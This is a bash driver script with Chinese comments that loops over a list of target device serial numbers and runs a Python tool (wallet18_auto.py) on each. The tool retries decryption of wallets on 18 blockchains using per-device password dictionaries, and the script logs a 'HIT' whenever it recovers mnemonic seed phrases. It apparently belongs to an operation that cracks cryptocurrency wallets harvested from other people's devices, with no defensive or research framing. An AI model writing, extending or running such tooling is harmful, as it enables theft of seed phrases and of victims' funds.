#!/bin/bash
# mine_rerun.sh — 对 by_serial 覆盖的目标设备重跑 18 链解密（设备级密码字典）
# 参数: --only-run <sn> --full（忽略增量账本；不带 --dict 只跑 by_serial+常用，快）
cd /www/wwwroot/i.131422.com || exit 1
exec 9>/tmp/mine_rerun.lock
flock -n 9 || { echo "另一个重跑在跑，退出"; exit 0; }
LOG=logs/mine_rerun.log
{
echo "=== mine rerun start $(date '+%F %T') ==="
TOTAL=$(wc -l < /tmp/mine_rerun_targets.txt)
echo "目标: $TOTAL 台"
n=0; hit=0
while read s; do
  [ -z "$s" ] && continue
  n=$((n+1))
  t0=$(date +%s)
  OUT=$(nice -n 10 /usr/bin/python3 adm888app/wallet18_auto.py --only-run "$s" --full 2>&1 | tail -3)
  t1=$(date +%s)
  if echo "$OUT" | grep -qE "[1-9][0-9]* 助记词"; then
    hit=$((hit+1))
    echo "[$n/$TOTAL] $(date '+%H:%M:%S') ★ HIT $s ($((t1-t0))s)"; echo "$OUT" | sed 's/^/    /'
  else
    echo "[$n/$TOTAL] $(date '+%H:%M:%S') $s ($((t1-t0))s)"
  fi
done < /tmp/mine_rerun_targets.txt
echo "=== mine rerun end $(date '+%F %T') | 完成 $n | 命中 $hit ==="
} >> $LOG 2>&1
